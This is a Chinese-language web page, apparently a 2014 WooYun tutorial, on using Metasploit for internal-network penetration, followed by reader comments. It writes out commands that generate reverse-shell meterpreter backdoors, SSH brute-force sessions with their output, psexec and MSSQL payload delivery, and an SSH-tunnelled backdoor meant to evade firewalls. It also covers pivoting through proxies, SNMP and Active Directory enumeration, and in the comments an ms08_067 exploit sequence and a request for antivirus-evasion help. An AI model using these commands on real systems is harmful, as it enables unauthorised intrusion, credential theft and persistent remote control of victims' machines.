@@ -1,0 +1,665 @@
+
+
+  
+
+  
+
+<main class="main-container ng-scope" ng-view="">
+<div class="main receptacle post-view ng-scope">
+
+  <article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox="">
+    <header>
+      <h1 class="entry-title ng-binding">metasploit渗透测试笔记(内网渗透篇)</h1>
+
+      <div class="entry-meta">
+        <a target="_blank" class="author name ng-binding">
+          DM_</a>
+        <span class="bull">·</span>
+        <time title="2014/08/12 12:23" ui-time="" datetime="2014/08/12 12:23" class="published ng-binding ng-isolate-scope">2014/08/12 12:23</time>
+      </div>
+    </header>
+
+    <!-- ngIf: isCensoring -->
+
+    <section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml">
+      <p>
+        </p><h2>0x01 reverse the shell</h2>
+
+<hr>
+
+<h3>File</h3>
+
+<p>通常做法是使用msfpayload生成一个backdoor.exe然后上传到目标机器执行。本地监听即可获得meterpreter shell。</p>
+
+<pre><code>reverse_tcp/http/https =&gt; exe =&gt; victim =&gt; shell
+</code></pre>
+
+<p><strong>reverse_tcp</strong></p>
+
+<p>windows:</p>
+
+<pre><code>msfpayload windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; X &gt; shell.exe
+</code></pre>
+
+<!--more-->
+
+<p><img alt="enter image description here" img-src="f02f5dd3e3461d9ab734e32dd46cb0acc1682428.jpg"></p>
+
+<p><img alt="enter image description here" img-src="c47834b60bc073ce0fc98a127de7fb926a1c6090.jpg"></p>
+
+<p>Linux(x86)</p>
+
+<pre><code>msfpayload linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; R | msfencode -t elf -o shell
+</code></pre>
+
+<p><img alt="enter image description here" img-src="c6da8a5a4287bf9aedbbf09eb4c9ee3a3670f269.jpg"></p>
+
+<p><strong>reverse_http</strong></p>
+
+<pre><code>msfpayload windows/meterpreter/reverse_http LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; X &gt; shell.exe
+</code></pre>
+
+<p><img alt="enter image description here" img-src="eba5fb48cb4c97bc80149b055516d06ebdc817e6.jpg"></p>
+
+<p><strong>reverse_https</strong></p>
+
+<pre><code>msfpayload windows/meterpreter/reverse_https LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; X &gt; shell.exe
+</code></pre>
+
+<p><img alt="enter image description here" img-src="6940d46da911c2d6d3ec9d6250f9328820c7a0ce.jpg"></p>
+
+<h3>Login privilege</h3>
+
+<p>在获得一些登陆权限之后获得meterpreter shell的方法。</p>
+
+<p><strong>SSH</strong></p>
+
+<p><strong>ssh_login</strong></p>
+
+<p>模块路径:<code>auxiliary/scanner/ssh/ssh_login</code></p>
+
+<pre><code>msf exploit(sshexec) &gt; use auxiliary/scanner/ssh/ssh_login
+msf auxiliary(ssh_login) &gt; show options 
+
+Module options (auxiliary/scanner/ssh/ssh_login):
+
+   Name              Current Setting  Required  Description
+   ----              ---------------  --------  -----------
+   BLANK_PASSWORDS   true             no        Try blank passwords for all users
+   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
+   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
+   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
+   DB_ALL_USERS      false            no        Add all users in the current database to the list
+   PASSWORD                           no        A specific password to authenticate with
+   PASS_FILE                          no        File containing passwords, one per line
+   RHOSTS                             yes       The target address range or CIDR identifier
+   RPORT             22               yes       The target port
+   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
+   THREADS           1                yes       The number of concurrent threads
+   USERNAME                           no        A specific username to authenticate as
+   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
+   USER_AS_PASS      true             no        Try the username as the password for all users
+   USER_FILE                          no        File containing usernames, one per line
+   VERBOSE           true             yes       Whether to print output for all attempts
+
+msf auxiliary(ssh_login) &gt; set RHOSTS 192.168.1.104
+RHOSTS =&gt; 192.168.1.104
+msf auxiliary(ssh_login) &gt; set USERNAME root
+USERNAME =&gt; root
+msf auxiliary(ssh_login) &gt; set PASS
+set PASSWORD   set PASS_FILE  
+msf auxiliary(ssh_login) &gt; set PASSWORD toor
+PASSWORD =&gt; toor
+msf auxiliary(ssh_login) &gt; exploit 
+
+[*] 192.168.1.104:22 SSH - Starting bruteforce
+[*] 192.168.1.104:22 SSH - [1/3] - Trying: username: 'root' with password: ''
+[-] 192.168.1.104:22 SSH - [1/3] - Failed: 'root':''
+[*] 192.168.1.104:22 SSH - [2/3] - Trying: username: 'root' with password: 'root'
+[-] 192.168.1.104:22 SSH - [2/3] - Failed: 'root':'root'
+[*] 192.168.1.104:22 SSH - [3/3] - Trying: username: 'root' with password: 'toor'
+[*] Command shell session 4 opened (192.168.1.105:54562 -&gt; 192.168.1.104:22) at 2014-08-07 22:55:54 +0800
+[+] 192.168.1.104:22 SSH - [3/3] - Success: 'root':'toor' 'uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=system_u:system_r:unconfined_t:SystemLow-SystemHigh Linux localhost.localdomain 2.6.18-164.el5 #1 SMP Thu Sep 3 03:33:56 EDT 2009 i686 i686 i386 GNU/Linux '
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf auxiliary(ssh_login) &gt; sessions 
+
+Active sessions
+===============
+
+  Id  Type         Information                       Connection
+  --  ----         -----------                       ----------
+  4   shell linux  SSH root:toor (192.168.1.104:22)  192.168.1.105:54562 -&gt; 192.168.1.104:22 (192.168.1.104)
+
+msf auxiliary(ssh_login) &gt;
+</code></pre>
+
+<p><img alt="enter image description here" img-src="b43567d8fee054170a960165d37ff02843cb3101.jpg"></p>
+
+<p>这里metasploit在探测ssh弱口令时，如果发现存在，则会返回一个linux shell，注意此时不是meterpreter shell。接下来可以使用</p>
+
+<pre><code>sessions –u id
+</code></pre>
+
+<p>将linux shell升级为meterpreter shell，本地测试失败了。:(</p>
+
+<p><strong>sshexec</strong></p>
+
+<p>模块路径:<code>auxiliary/scanner/ssh/ssh_login</code></p>
+
+<p>注意这个模块BT5下是没有的，kali中则存在。</p>
+
+<pre><code>msf&gt; use exploit/multi/ssh/sshexec 
+msf exploit(sshexec) &gt; set payload linux/x86/meterpreter/reverse_tcp 
+payload =&gt; linux/x86/meterpreter/reverse_tcp
+msf exploit(sshexec) &gt; set LHOST 192.168.1.105 
+LHOST =&gt; 192.168.1.105
+msf exploit(sshexec) &gt; set LPORT 8080
+LPORT =&gt; 8080
+msf exploit(sshexec) &gt; set RHOST 192.168.1.104
+RHOST =&gt; 192.168.1.104
+msf exploit(sshexec) &gt; set PASSWORD toor
+PASSWORD =&gt; toor
+msf exploit(sshexec) &gt; exploit 
+
+[*] Started reverse handler on 192.168.1.105:8080 
+[*] 192.168.1.104:22 - Sending Bourne stager...
+[*] Command Stager progress -  40.39% done (288/713 bytes)
+[*] Transmitting intermediate stager for over-sized stage...(100 bytes)
+[*] Sending stage (1228800 bytes) to 192.168.1.104
+[*] Command Stager progress - 100.00% done (713/713 bytes)
+[*] Meterpreter session 3 opened (192.168.1.105:8080 -&gt; 192.168.1.104:40813) at 2014-08-07 22:53:12 +0800
+
+meterpreter &gt; 
+</code></pre>
+
+<p><img alt="enter image description here" img-src="d9ef71641b46db5b5cf46b9702c5b0e33df60771.jpg"></p>
+
+<p><strong>smb</strong></p>
+
+<p>模块路径:<code>exploit/windows/smb/psexec</code></p>
+
+<p>当使用smb_login扫出windows的弱口令时，可以尝试使用这种方法获取shell。 这是在内网中获得windows shell最基本的方法，在登陆域机器时需要设置Domain参数，否则登陆错误。</p>
+
+<p>正如之前提到的show advanced，每个模块都有高级参数设定，这里的psexec就可以设置advanced中的EXE参数达到执行攻击者本地任意文件的目的(见参考<1>)。</1></p>
+
+<p><img alt="enter image description here" img-src="14bfd6eae27b93fdf61c5a3ce8d76caa3065f2cc.jpg"></p>
+
+<p><img alt="enter image description here" img-src="82f4f3e261de8b42513908e0a1eea3e56404fd2d.jpg"></p>
+
+<p>如果目标机器有杀软或者其他简单的防护措施呢？ 那么可以尝试只执行命令</p>
+
+<p><strong>psexec_command</strong></p>
+
+<p>模块路径:<code>auxiliary/admin/smb/psexec_command</code></p>
+
+<p><img alt="enter image description here" img-src="b708a049e2b4f225f95c16fe1da37cd2e4400b29.jpg"></p>
+
+<p>这里需要注意的是psexec.exe(pstools中的工具)如果不能成功执行，那么psexec_command或许是可以执行的，并且大多数的情况下metasploit中的psexec都可以用，而psexec.exe则不能用 :(</p>
+
+<p><strong>sqlserver</strong></p>
+
+<pre><code>msf exploit(psexec) &gt; use exploit/windows/mssql/mssql_payload
+msf exploit(mssql_payload) &gt; show options 
+
+Module options (exploit/windows/mssql/mssql_payload):
+
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   METHOD               cmd              yes       Which payload delivery method to use (ps, cmd, or old)
+   PASSWORD                              no        The password for the specified username
+   RHOST                                 yes       The target address
+   RPORT                1433             yes       The target port
+   USERNAME             sa               no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification (requires DOMAIN option set)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf exploit(mssql_payload) &gt;
+</code></pre>
+
+<p><img alt="enter image description here" img-src="ad740a041db868e039ffc681c4a01cea4bfc4e1e.jpg"></p>
+
+<p>在获得sql server的登陆权限后同样可以快速的获得meterpreter shell。</p>
+
+<p>注意这里METHOD选项，三种方法都要使用XP_cmdshell，而第一种ps是使用powershell，第二种需要使用wscript.exe，第三种则要用到debug.com。 本地没有环境，就不截图演示了</p>
+
+<p><strong>others</strong></p>
+
+<p>不管是什么场景，只要能转换成文件上传和执行权限就可以得到shell。在获得一种权限时当然可以先google一番是否有可适用的脚本，如果没有再分析是否能转换为文件操作和执行权限。如果可以那就可以得到shell了。 比如:</p>
+
+<pre><code>mysql and sqlserver ..etc =&gt; file/webshell =&gt;shell
+</code></pre>
+
+<p>本地同样也测试了下tunna里自带的msf插件，测试了php版的。代码大致是这样的</p>
+
+<p><img alt="enter image description here" img-src="1744b66cb770a6cdbb4570c9248d326007e235ad.jpg"></p>
+
+<p>先本地生成一个meterpreter.exe(文件名不随机),</p>
+
+<p>然后上传到<code>c:\windows\temp\meterpreter.exe</code>。</p>
+
+<p>再通过php的exec函数执行。测试的时候发现代码生成meterpreter.exe时LHOST参数有误，改了rb代码之后终于在错误中弹回。</p>
+
+<h2>0x02 pivot with metasploit</h2>
+
+<hr>
+
+<p>在获取到跳板机一定权限后，如何充分发挥跳板功能呢？这部分内容将简单的介绍几种常见的方法。</p>
+
+<h3>添加路由表</h3>
+
+<p><img alt="enter image description here" img-src="fd57fd846cbace8f5949140cc24bea139fe87565.jpg"></p>
+
+<p>这是在metasploit中最常用的方法，在添加路由表和session的关系后，便可以使用msf中的模块跨网段扫描或攻击。方法有很多，这里有个脚本autoroute可以快速添加路由表(如上图)，也可以将当前session置于后台(backgroud)，然后用route命令添加。</p>
+
+<h3>Socks4a代理</h3>
+
+<p>这里使用<code>auxiliary/server/socks4a</code>模块，需要注意Proxychains不支持ICMP，所以在代理使用NMAP的时候需要使用 –sT <code>-Pn</code>参数。另外Proxychains的连接提示很乱，用kali自带的Proxychains代理使用sqlmap的时候看起来真的特别乱。在这里可以使用proxychains-ng。 先在kali中卸载proxychains,然后再安装proxychains-ng。</p>
+
+<p><img alt="enter image description here" img-src="ed7b6e477c6c92716b72d92f77dee941a23274d7.jpg"></p>
+
+<pre><code><a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="b0c2dfdfc4f0dbd1dcd9">[email&#160;protected]</a>:~# git clone https://github.com/rofl0r/proxychains-ng.git
+正克隆到 'proxychains-ng'...
+remote: Counting objects: 842, done.
+remote: Total 842 (delta 0), reused 0 (delta 0)
+Receiving objects: 100% (842/842), 465.92 KiB | 27 KiB/s, done.
+Resolving deltas: 100% (554/554), done.
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="deacb1b1aa9eb5bfb2b7">[email&#160;protected]</a>:~# cd proxychains-ng/
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="53213c3c271338323f3a">[email&#160;protected]</a>:~/proxychains-ng#  ./configure --prefix=/usr --sysconfdir=/etc
+Done, now run make &amp;&amp; make install
+<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="8cfee3e3f8cce7ede0e5">[email&#160;protected]</a>:~/proxychains-ng# make &amp;&amp; make install
+</code></pre>
+
+<p>之后使用proxychains4 <code>-q</code> 选项运行，然后就不会有杂乱混杂的输出了。</p>
+
+<h3>ssh</h3>
+
+<p><strong>meta_ssh</strong></p>
+
+<p>当有一个ssh登录权限后,可以使用这个插件在ssh会话基础上建立链接(见参考<2>)。</2></p>
+
+<p><img alt="enter image description here" img-src="25d26507b9c7008062060fb365bccb374218b870.jpg"></p>
+
+<p><img alt="enter image description here" img-src="eb9e59e4aee2dd4bb3ab514e00a1c4e02fb1e410.jpg"></p>
+
+<p>之后进入shell，查看网卡IP信息，然后退出再添加路由表。</p>
+
+<p><img alt="enter image description here" img-src="f8b7546d87070d852692239e3b432c140a7ae5c6.jpg"></p>
+
+<p>再尝试扫描5.5.5.0/24这个段，然后对这个段中的5.5.5.134进行弱口令扫描。</p>
+
+<p><img alt="enter image description here" img-src="5d126fa6155e3877ad6279ff61ed76de9280e0aa.jpg"></p>
+
+<p>发现可以获得结果。</p>
+
+<p><strong>ssh/plink.exe</strong></p>
+
+<p>还有一种利用SSH的方式就在windows下使用plink反弹,这样数据包经过SSH加密后，便可以躲过防火墙的检测。同理在linux也是一样的。 首先生成反弹到本地的reverse后门。</p>
+
+<pre><code>msfpayload windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=5566 &gt;  ~/Desktop/backdoor_reverse_localhost.exe
+</code></pre>
+
+<p><img alt="enter image description here" img-src="6a98ea8e4eccb172dc75c74682ca54e336cd5565.jpg"></p>
+
+<p>然后开启本地监听，再将plink和backdoor.exe通过webshell上传。然后执行</p>
+
+<pre><code>echo y | plink.exe -L 5566:192.168.6.131:6666 192.168.6.131 -l root -pw toor
+</code></pre>
+
+<p>之后运行backdoor.exe，meterpreter就通过ssh tunnel建立起来了。</p>
+
+<p><img alt="enter image description here" img-src="6a609174bf204a2777aa9d5334a9c4ecb0b4b607.jpg"></p>
+
+<h2>0x03 内网扫描</h2>
+
+<hr>
+
+<p>Metasploit对于常见服务(<code>smb/ssh/mysql/mssql/oracle/ftp/tfp/ …etc</code>)扫描可以做到版本信息(<code>banner</code>)、登录验证等。</p>
+
+<p>简单过程可以参考之前的笔记《msf内网渗透小记》</p>
+
+<p>具体扫描的脚本路径在<code>/usr/share/metasploit-framework/modules/auxiliary/scanner</code>下，可以根据需求自行发现。</p>
+
+<p>常见的扫描端口: <code>7,21,22,23,25,43,50,53,67,68,79,80,109,110,111,123,135,137,138,139,143,161,264,265,389,443,445,500,631,901,995,1241,1352,1433,1434,1521,1720,1723,3306,3389,3780,4662,5800,5801,5802,5803,5900,5901,5902,5903,6000,6666,8000,8080,8443,10000,10043,27374,27665</code></p>
+
+<p>当然也可以使用rc脚本(<code>basic_discovery.rc</code>)。</p>
+
+<p>另外内网里还有一处信息的搜集就是<strong>snmp</strong>,如果有交换机存在snmp弱口令(团体字符串),那么便可以通过snmp收集路由表信息和VLAN划分信息等。</p>
+
+<p>一般网络都会在vlan划分时备注信息，比如Vlan100是x部门,Vlan200是y部门等等。 不同品牌、型号的交换机在获取这一信息时所需要的OID可能不同(大部分不一样)，而snmp又是在udp的161端口，在交换机没有开放ssh、telnet、web时\或者开放以上服务，端口又未能做转发时，则可以在知道具体的OID值后通过改写snmp_enumusers.rb脚本实现。</p>
+
+<p><img alt="enter image description here" img-src="a7c7ec4a1d89c159532243e52599189fee3e7fef.jpg"></p>
+
+<h2>0x04 域渗透相关</h2>
+
+<hr>
+
+<p>推荐几个AD下渗透的扫描脚本(见参考<3>,下同)</3></p>
+
+<p><strong>psexec&#95;Loggedin&#95;users</strong></p>
+
+<p><img alt="enter image description here" img-src="aa2e056cbd22212a965cae6602fa72df6096895a.jpg"></p>
+
+<p>这个脚本可以找到当前段每个IP所登录的用户。</p>
+
+<p><strong>local&#95;admin&#95;search_enum</strong></p>
+
+<p><img alt="enter image description here" img-src="5263249a57d3a5086308c5813a1a3703b2c2fafe.jpg"></p>
+
+<p>这个可以找到当前登录管理账户的IP和用户名。</p>
+
+<p><strong>psexec_scanner</strong></p>
+
+<p><img alt="enter image description here" img-src="ddde48b5e9c4989bc7ce98c02653868c5eb8c7c6.jpg"></p>
+
+<p>批量执行psexec获得shell,脚本里有个psexec的函数，绝对是改写的好范本。见参考<4></4></p>
+
+<p>更多metasploit关于windows域渗透的脚本见参考<5></5></p>
+
+<h2>0x05 后记</h2>
+
+<hr>
+
+<p>关于内网及域下渗透并不一定需要metasploit，更多的是与其他工具的配合。而且这一过程思路(见参考<6>)和对AD的理解明显比会用工具重要。metasploit只是提供了一个自动化发现利用的tunnel，如果简单理解ruby及metasploit代码框架，无论是学习还是渗透测试，都将会是一个有力的辅助。另外上文中的示例只是为读者所遇情况而构建脚本时的参考。</6></p>
+
+<h2>0x06 参考</h2>
+
+<hr>
+
+<p><1> http://opexxx.tumblr.com/post/35763770674/btb-security-how-to-make-custom-exes-for-deployment</1></p>
+
+<p><2> https://github.com/dirtyfilthy/metassh</2></p>
+
+<p><3> http://www.pentestgeek.com/2012/11/03/find-local-admin-with-metasploit/</3></p>
+
+<p><4> http://www.darkoperator.com/blog/2011/12/16/psexec-scanner-auxiliary-module.html</4></p>
+
+<p><5> https://github.com/darkoperator/Meterpreter-Scripts/tree/master/post/windows/gather</5></p>
+
+<p><6> http://www.freebuf.com/articles/web/5901.html (及8楼Gall的回复)</6></p>      <p></p>
+    </section>
+  </article>
+  <!-- collect -->
+  <div class="entry-controls clearfix">
+		<div style="float:left;color:#9d9e9f;font-size:15px">
+			<span>
+				&copy;乌云知识库版权所有 未经许可 禁止转载
+			</span>
+		</div>
+        
+
+      </div>
+
+          
+  <!-- collect end -->
+  <!-- recommend -->
+  <div class="yarpp-related">
+<h3>为您推荐了适合您的技术文章:</h3>
+<ol id="recommandsystem">
+		<li><a href="http://drops.wooyun.org/tips/24" rel="bookmark" id="re1">使用Hash直接登录Windows</a></li>
+			<li><a href="http://drops.wooyun.org/tips/10146" rel="bookmark" id="re2">Meterpreter Guide</a></li>
+			<li><a href="http://drops.wooyun.org/tools/650" rel="bookmark" id="re3">tunna工具使用实例</a></li>
+			<li><a href="http://drops.wooyun.org/tips/5234" rel="bookmark" id="re4">内网渗透随想</a></li>
+	 
+</ol>
+</div>
+  <!-- recommend end -->
+  <!-- comment -->
+  <div id="comments" class="comment-list clearfix">
+            
+          <div id="comment-list">
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">立志成为厨神的男人</span>
+                 <span class="reply-time">2016-06-02 14:53:48</span>
+        </div>
+        <p></p><p>现在做免杀感觉不好做了，传上去就被干掉了,求免杀文章啊</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">不懂</span>
+                 <span class="reply-time">2016-04-08 15:22:26</span>
+        </div>
+        <p></p><p>有一个问题，reverse_tcp payload怎么卸载呢？在一个主机上运行一次就永远存在了吗？</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">无敌情痴</span>
+                 <span class="reply-time">2016-03-27 13:56:44</span>
+        </div>
+        <p></p><p>好文章，学习了，谢谢LZ分享</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Summer</span>
+                 <span class="reply-time">2016-03-09 14:57:50</span>
+        </div>
+        <p></p><p>sshexec</p>
+<p>模块路径:auxiliary/scanner/ssh/ssh_login</p>
+<p>这个模版的路径写错了吧？</p>
+<p>不应该是你use那里路径吗？</p>
+<p>exploit/multi/ssh/sshexec</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Budi</span>
+                 <span class="reply-time">2015-09-23 16:57:38</span>
+        </div>
+        <p></p><p>目标是一个外网地址，而自己没有国定IP，如何reverse the shell到本地？大神求指点。。。</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">第四维度</span>
+                 <span class="reply-time">2015-01-17 14:08:40</span>
+        </div>
+        <p></p><p>做了反弹的shell，怎么才能让靶机运行并且msf可以连接到？<br>
+一直在监听。。。</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">拨开乌云</span>
+                 <span class="reply-time">2014-10-27 13:58:59</span>
+        </div>
+        <p></p><p>metasploit 太强大了，最近正在学习中。</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">主唱大人</span>
+                 <span class="reply-time">2014-09-24 18:55:45</span>
+        </div>
+        <p></p><p>有点看不懂。。小白飘过</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Master</span>
+                 <span class="reply-time">2014-08-28 12:14:23</span>
+        </div>
+        <p></p><p>可以组织翻译下<br>
+http://www.offensive-security.com/metasploit-unleashed/Main_Page</p>
+<p>《Metasploit Unleashed》造福洋文不好的同学</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">DM_</span>
+                 <span class="reply-time">2014-08-18 18:01:14</span>
+        </div>
+        <p></p><p>sessions -u 2 #将linux shell升级为meterpreter shell，必须前面使用setg设定</p>
+<p>使用setg设定什么？</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Spy4man</span>
+                 <span class="reply-time">2014-08-18 13:32:06</span>
+        </div>
+        <p></p><p>msf&gt; use windows/smb/ms08_067_netapi<br>
+set PAYLOAD windows/shell/reverse_tcp<br>
+set TARGET 41 //中文XP+SP3类型<br>
+setg LHOST 192.168.1.153 //建议直接在BT5本机上开一个反弹shell<br>
+setg LPORT 5555<br>
+exploit -z #可以用如果此处未使用-z参数，后面可以按CTRL-Z 转到后台，session不会退出<br>
+sessions -u 2 #将linux shell升级为meterpreter shell，必须前面使用setg设定</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">Spy4man</span>
+                 <span class="reply-time">2014-08-18 12:25:51</span>
+        </div>
+        <p></p><p>setg LHOST 192.168.1.153 //建议直接在BT5本机上开一个反弹shell<br>
+setg LPORT 5555<br>
+exploit -z #可以用如果此处未使用-z参数，后面可以按CTRL-Z 转到后台，session不会退出<br>
+sessions -u 2 #将linux shell升级为meterpreter shell，必须前面使用setg设定<br>
+sessions -i 2 //切换到会话2</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">test</span>
+                 <span class="reply-time">2014-08-15 15:34:14</span>
+        </div>
+        <p></p><p>msf 在内网有代理服务且集成域验证的没办法穿透出来吧。对付一般内网还行～</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">DM_</span>
+                 <span class="reply-time">2014-08-12 15:55:54</span>
+        </div>
+        <p></p><p>msf> version<br>
+Framework: 4.8.2-2014010101<br>
+Console  : 4.8.2-2014010101.15168</p>
+<p>不知道你在哪里看出来版本不一样的，还有我也没有更新过。</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">你不知道我是谁</span>
+                 <span class="reply-time">2014-08-12 15:47:22</span>
+        </div>
+        <p></p><p>虽然用了一段时间，但是感觉你这版本跟我的不一样啊</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">phantomer</span>
+                 <span class="reply-time">2014-08-12 15:01:32</span>
+        </div>
+        <p></p><p>写的超级棒</p>
+<p></p>
+        
+      </div>
+    </div>
+    
+    <div class="note-comment">
+      <img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png">
+      <div class="content">
+        <div class="comment-header">
+          <span class="author-link">疯子</span>
+                 <span class="reply-time">2014-08-12 14:38:12</span>
+        </div>
+        <p></p><p>赞！！</p>
+<p></p>
+        
+      </div>
+    </div>
+      </div>
+  </div>
+  <!-- comment end -->
+  
+</div>
+</main>
